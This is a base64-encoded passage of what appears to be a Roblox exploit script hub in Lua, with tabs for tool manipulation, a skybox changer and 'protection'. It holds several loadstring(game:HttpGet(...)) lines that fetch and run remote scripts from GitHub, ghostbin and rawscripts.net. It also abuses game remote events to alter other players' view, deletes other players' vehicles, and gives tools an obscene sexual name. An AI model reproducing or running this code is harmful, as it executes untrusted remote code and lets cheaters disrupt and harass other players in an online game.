rIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xOC41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0xOS41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yMC41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yMS41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yMi41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yMy41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNC41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNS41LCA0KQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBDRnJhbWUubmV3KC0wLjc4NDA4OTgwNCwgMC42MjM0NTI2NjMsIDAuOTI4NDc0NDI2LCAwLjYxMTYzMTYzMiwgMC4wMjAyODEyNDAzLCAtMC43OTA4ODI2NDcsIDAuMTA3ODY0MDk3LCAwLjk4ODE5ODg3NiwgMC4xMDg3NTgyMTEsIDAuNzgzNzU1MTI0LCAtMC4xNTE4Mjc4MTIsIDAuNjAyMjI2MDE5KSArIFZlY3RvcjMubmV3KDAsIC0yNiwgMykKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uTmFtZSA9ICJCaWcgQmxhY2sgRGljayBMbWFvIgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gQ0ZyYW1lLm5ldygtMC43ODQwODk4MDQsIDAuNjIzNDUyNjYzLCAwLjkyODQ3NDQyNiwgMC42MTE2MzE2MzIsIDAuMDIwMjgxMjQwMywgLTAuNzkwODgyNjQ3LCAwLjEwNzg2NDA5NywgMC45ODgxOTg4NzYsIDAuMTA4NzU4MjExLCAwLjc4Mzc1NTEyNCwgLTAuMTUxODI3ODEyLCAwLjYwMjIyNjAxOSkgKyBWZWN0b3IzLm5ldygwLCAtMjcsIDIpCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSAiQmlnIEJsYWNrIERpY2sgTG1hbyIKICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5CYWNrcGFja1t0b29sc10uR3JpcCA9IENGcmFtZS5uZXcoLTAuNzg0MDg5ODA0LCAwLjYyMzQ1MjY2MywgMC45Mjg0NzQ0MjYsIDAuNjExNjMxNjMyLCAwLjAyMDI4MTI0MDMsIC0wLjc5MDg4MjY0NywgMC4xMDc4NjQwOTcsIDAuOTg4MTk4ODc2LCAwLjEwODc1ODIxMSwgMC43ODM3NTUxMjQsIC0wLjE1MTgyNzgxMiwgMC42MDIyMjYwMTkpICsgVmVjdG9yMy5uZXcoMCwgLTI3LCAwKQogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gIkJpZyBCbGFjayBEaWNrIExtYW8iCiAgICAgICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2ZyYW1lCiAgICAgICAgICAgICAgICB3YWl0KDAuNSkKICAgICAgICAgICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0b29sLk5hbWUgPT0gbmFtZXRvb2xzIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwgVW5pdmVyc2FsVGFiID0gV2luZG93Ok1ha2VUYWIoeyLvuLFTY3JpcHRzIiwgInJieGFzc2V0aWQ6Ly8xMDkyNDIzNDgzNzUzMjMifSkKCi0tIFNlw6fDo28gcGFyYSBTY3JpcHRzIFVuaXZlcnNhaXMKU2VjdGlvbiA9IFVuaXZlcnNhbFRhYjpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAiQSB0YWIgY29udGFpbmluZyByZWNvbW1lbmRlZCBvciBwYXJ0bmVyIHNjcmlwdHMuIgp9KQoKVW5pdmVyc2FsVGFiOkFkZFBhcmFncmFwaCh7CiAgICBUaXRsZSA9ICJXYW50IHRvIHBhcnRuZXIgdXA/IFNheSBvbiBteSBkaXNjb3JkIHNlcnZlci4iLAogICAgQ29udGVudCA9ICJuaWwuIgp9KQoKVW5pdmVyc2FsVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkF1cmFseW54IE11c2ljIChVTklWRVJTQUwpIOKAlCBieSBMeW54IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRnJlZW1hbjc4MjkvZnJlZW1hbnNjcmlwdHMvbWFpbi93cmFwcGVyLWZyZWVtYW4ubHVhIikpKCkKICAgIGVuZAp9KQoKVW5pdmVyc2FsVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkNvcXVldHRlIEh1YiDigJQgYnkgTG9seXRhZGV2IiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL2dob3N0YmluLmF4ZWwub3JnL3Bhc3RlLzh6NGh5L3JhdyIpKSgpCiAgICBlbmQKfSkKClVuaXZlcnNhbFRhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJOYW1lbGVzcyBBZG1pbiDigJQgYnkgQWVydmFuaXgiLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbigpCiAgICAgICAgbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9sdHNldmVyeWRheXlvdS9OYW1lbGVzcy1BZG1pbi9tYWluL1NvdXJjZS5sdWEiKSkoKQogICAgZW5kCn0pCgpVbml2ZXJzYWxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAiQUZFTSBNQVgg4oCUIGJ5IFlBUkhNIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhd3NjcmlwdHMubmV0L3Jhdy9Vbml2ZXJzYWwtU2NyaXB0LUFGRU0tTWF4LU9wZW4tQWxwaGEtNTAyMTAiKSkoKQogICAgZW5kCn0pCgpVbml2ZXJzYWxUYWI6QWRkQnV0dG9uKHsKICAgIE5hbWUgPSAi8J+YjiBZb3VyIHNjcmlwdCBjb3VsZCBiZSBoZXJlISDwn5iOIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvYWRzdHJpbmcoZ2FtZTpIdHRwR2V0KCJodHRwczovLyIpKSgpCiAgICBlbmQKfSkKCgpsb2NhbCBUYWIxNyA9IFdpbmRvdzpNYWtlVGFiKHsi77ixU2t5Ym94IiwgInJieGFzc2V0aWQ6Ly8xMzYwNjg4MTkzNTU5NzUifSkKClNlY3Rpb24gPSBUYWIxNzpBZGRTZWN0aW9uKHsKICAgIE5hbWUgPSAiV2FudCB0byB0dXJuIHRoZSBza3kgaW50byBDMDBsa2lkZD8gSGVyZSBpdCBpcyEiCn0pCgpUYWIxNzpBZGRCdXR0b24oewogICAgTmFtZSA9ICJTa3lib3giLAogICAgRGVzY3JpcHRpb24gPSAi8J+ThO+4sUVuYWJsZSBza3lib3guIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCiAgICAgICAgbG9jYWwgV2VhclNoaXJ0ID0gUmVwbGljYXRlZFN0b3JhZ2UuUmVtb3Rlcy5XZWFyU2hpcnQKICAgICAgICBXZWFyU2hpcnQ6SW52b2tlU2VydmVyKDk4Njc5MzU4MzMxNjU0KQoKICAgICAgICBsb2NhbCBhcmdzID0ge3sxMDA4Mzk1MTMwNjU0MzJ9fQogICAgICAgIGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5SZW1vdGVzLkNoYW5nZUNoYXJhY3RlckJvZHk6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAKICAgICAgICAtLSBBbmltYcOnw6NvCiAgICAgICAgbG9jYWwgcGxheWVyID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCiAgICAgICAgbG9jYWwgY2hhcmFjdGVyID0gcGxheWVyLkNoYXJhY3RlciBvciBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6V2FpdCgpCiAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyYWN0ZXI6V2FpdEZvckNoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gTG9hZFRyYWNrKGlkKQogICAgICAgICAgICBsb2NhbCBuZXdBbmltID0gSW5zdGFuY2UubmV3KCJBbmltYXRpb24iKQogICAgICAgICAgICBuZXdBbmltLkFuaW1hdGlvbklkID0gInJieGFzc2V0aWQ6Ly8iIC4uIHRvc3RyaW5nKGlkKQogICAgICAgICAgICBsb2NhbCBuZXdUcmFjayA9IGh1bWFub2lkOkxvYWRBbmltYXRpb24obmV3QW5pbSkKICAgICAgICAgICAgbmV3VHJhY2suUHJpb3JpdHkgPSBFbnVtLkFuaW1hdGlvblByaW9yaXR5LkFjdGlvbjQKICAgICAgICAgICAgbmV3VHJhY2s6UGxheSgwLjEsIDEsIDEpCiAgICAgICAgICAgIHJldHVybiBuZXdUcmFjawogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBFbW90ZUlkID0gMTAxODUyMDI3OTk3MzM3CiAgICAgICAgTG9hZFRyYWNrKEVtb3RlSWQpCiAgICAgICAgCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiU2t5Ym94IiwKICAgICAgICAgICAgVGV4dCA9ICJTa3lib3ggZW5hYmxlZC4iLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICB9KQogICAgZW5kCn0pCgpUYWIxNzpBZGRCdXR0b24oewogICAgTmFtZSA9ICJEaXNhYmxlIHNreWJveCIsCiAgICBEZXNjcmlwdGlvbiA9ICLwn5OE77ixUmVtb3ZlcyBza3lib3guIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFJlcGxpY2F0ZWRTdG9yYWdlID0gZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpCiAgICAgICAgbG9jYWwgUmVtb3RlID0gUmVwbGljYXRlZFN0b3JhZ2UuUmVtb3Rlcy5SZXNldENoYXJhY3RlckFwcGVhcmFuY2UKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIFJlbW90ZTpGaXJlU2VydmVyKCkKICAgICAgICBlbmQpCgogICAgICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIGNoYXJhY3RlciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICBsb2NhbCBodW1hbm9pZCA9IGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZE9mQ2xhc3MoIkh1bWFub2lkIikKICAgICAgICAgICAgaWYgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KICAgICAgICAgICAgICAgICAgICB0cmFjazpTdG9wKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJTa3lib3giLAogICAgICAgICAgICBUZXh0ID0gIlNreWJveCBkaXNhYmxlZC4iLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICB9KQogICAgZW5kCn0pCgoKbG9jYWwgVGFiMTggPSBXaW5kb3c6TWFrZVRhYih7Iu+4sVByb3RlY3Rpb24iLCAicmJ4YXNzZXRpZDovLzk0MTI5NjE0NTE2NzY4In0pCgpsb2NhbCBMb2NhbFBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCmxvY2FsIFdvcmtzcGFjZSA9IGdhbWU6R2V0U2VydmljZSgiV29ya3NwYWNlIikKbG9jYWwgUnVuU2VydmljZSA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpCgpsb2NhbCBiYWNrdXBUYWJsZXMgPSB7CiAgICBWZWhpY2xlcyA9IHt9LAogICAgQ2Fub2VzID0ge30sCiAgICBKZXRzID0ge30sCiAgICBIZWxpcyA9IHt9LAogICAgQmFsbHMgPSB7fQp9Cgpsb2NhbCBUZWxlcG9ydENhcnJvID0ge30KZnVuY3Rpb24gVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8obXNnKQogICAgcHJpbnQoIsOwxbjigJ3igJ0gIi4ubXNnKQplbmQKCmxvY2FsIGZ1bmN0aW9uIEFudGlGbGluZ0xvb3AobmFtZSwgZ2V0Rm9sZGVyRnVuYykKICAgIGxvY2FsIGFjdGl2ZSA9IGZhbHNlCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSB0cnVlIGRvCiAgICAgICAgICAgIGlmIGFjdGl2ZSBhbmQgTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGZvbGRlciA9IGdldEZvbGRlckZ1bmMoKQogICAgICAgICAgICAgICAgaWYgZm9sZGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgaXRlbSBpbiBpcGFpcnMoZm9sZGVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGlzTWluZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5hbWUgPT0gIlZlaGljbGVzIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgc2VhdCBpbiBpcGFpcnMoaXRlbTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChzZWF0OklzQSgiVmVoaWNsZVNlYXQiKSBvciBzZWF0OklzQSgiU2VhdCIpKSBhbmQgc2VhdC5PY2N1cGFudCBhbmQgc2VhdC5PY2N1cGFudC5QYXJlbnQgPT0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNNaW5lID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBuYW1lID09ICJDYW5vZXMiIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIG93bmVyID0gaXRlbTpGaW5kRmlyc3RDaGlsZCgiT3duZXIiKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNNaW5lID0gb3duZXIgYW5kIG93bmVyLlZhbHVlID09IExvY2FsUGxheWVyCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiBuYW1lID09ICJKZXRzIiBvciBuYW1lID09ICJIZWxpcyIgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgaXNNaW5lID0gaXRlbS5OYW1lID09IExvY2FsUGxheWVyLk5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBpc01pbmUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGJhY2t1cFRhYmxlc1tuYW1lXSwgaXRlbTpDbG9uZSgpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaXRlbTpEZXN0cm95KCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjAzKQogICAgICAgIGVuZAogICAgZW5kKQogICAgcmV0dXJuIGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIGFjdGl2ZSA9IHN0YXRlCiAgICAgICAgVGVsZXBvcnRDYXJybzpNb3N0cmFyTm90aWZpY2FjYW8obmFtZS4uIiAiLi4oc3RhdGUgYW5kICJlbmFibGVkISIgb3IgImRpc2FibGVkISIpKQogICAgICAgIGlmIG5vdCBzdGF0ZSB0aGVuCiAgICAgICAgICAgIGZvciBfLCBpdGVtIGluIGlwYWlycyhiYWNrdXBUYWJsZXNbbmFtZV0pIGRvCiAgICAgICAgICAgICAgICBsb2NhbCBwYXJlbnRGb2xkZXIgPSBnZXRGb2xkZXJGdW5jKCkKICAgICAgICAgICAgICAgIGlmIHBhcmVudEZvbGRlciB0aGVuIGl0ZW0uUGFyZW50ID0gcGFyZW50Rm9sZGVyIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgYmFja3VwVGFibGVzW25hbWVdID0ge30KICAgICAgICBlbmQKICAgIGVuZAplbmQKIApTZWN0aW9uID0gVGFiMTg6QWRkU2VjdGlvbih7CiAgICBOYW1lID0gIldhbnQgdG8gcHJvdGVjdCB5b3Vyc2VsZiBhZ2FpbnN0IHNjcmlwdHM/IEkndmUgZ290IHRoaXMgZm9yIHlvdSBiZWxvdy4iCn0pCgpUYWIxODpBZGRCdXR0b24oewogICAgTmFtZSA9ICJCdWcgcHJvdGVjdGlvbiAoSXJyZXZlcnNpYmxlKSIsCiAgICBEZXNjcmlwdGlvbiA9ICLwn5OE77ixQ3JlYXRlcyBhIHByb3RlY3Rpb24gYWdhaW5zdCB0aGUgQnVncy9TY3JpcHRlcnMuIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIFBsYXllcnMgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKQogICAgICAgIGxvY2FsIExvY2FsUGxheWVyID0gUGxheWVycy5Mb2NhbFBsYXllcgoKICAgICAgICBsb2NhbCBibGFja2xpc3QgPSB7CiAgICAgICAgICAgIHtOYW1lID0gIndhdGVyIiwgQ2xhc3MgPSAiUGFydCJ9LAogICAgICAgIH0KCiAgICAgICAgbG9jYWwgZnVuY3Rpb24gbmV1dHJhbGl6ZShwYXJ0KQogICAgICAgICAgICBpZiBwYXJ0IGFuZCBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgcGFydC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIHBhcnQuTWFzc2xlc3MgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgcGFydC5UcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgICAgICAgICAgICAgcGFydDpDbGVhckFsbENoaWxkcmVuKCkKICAgICAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBwYXJ0OkRlc3Ryb3koKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKCiAgICAgICAgd29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKG9iaikKICAgICAgICAgICAgZm9yIF8sIHJ1bGUgaW4gaXBhaXJzKGJsYWNrbGlzdCkgZG8KICAgICAgICAgICAgICAgIGlmIG9iai5OYW1lID09IHJ1bGUuTmFtZSBhbmQgb2JqLkNsYXNzTmFtZSA9PSBydWxlLkNsYXNzIHRoZW4KICAgICAgICAgICAgICAgICAgICBuZXV0cmFsaXplKG9iaikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCgogICAgICAgIGZvciBfLCBvYmogaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBmb3IgXywgcnVsZSBpbiBpcGFpcnMoYmxhY2tsaXN0KSBkbwogICAgICAgICAgICAgICAgaWYgb2JqLk5hbWUgPT0gcnVsZS5OYW1lIGFuZCBvYmouQ2xhc3NOYW1lID09IHJ1bGUuQ2xhc3MgdGhlbgogICAgICAgICAgICAgICAgICAgIG5ldXRyYWxpemUob2JqKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAoKICAgICAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICAgICAgd2hpbGUgdGFzay53YWl0KDAuMjUpIGRvCiAgICAgICAgICAgICAgICBmb3IgXywgcnVsZSBpbiBpcGFpcnMoYmxhY2tsaXN0KSBkbwogICAgICAgICAgICAgICAgICAgIGZvciBfLCB2IGluIG5leHQsIGdldG5pbGluc3RhbmNlcygpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSBydWxlLk5hbWUgYW5kIHYuQ2xhc3NOYW1lID09IHJ1bGUuQ2xhc3MgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmV1dHJhbGl6ZSh2KQogICAgICAgICAgICAgICAg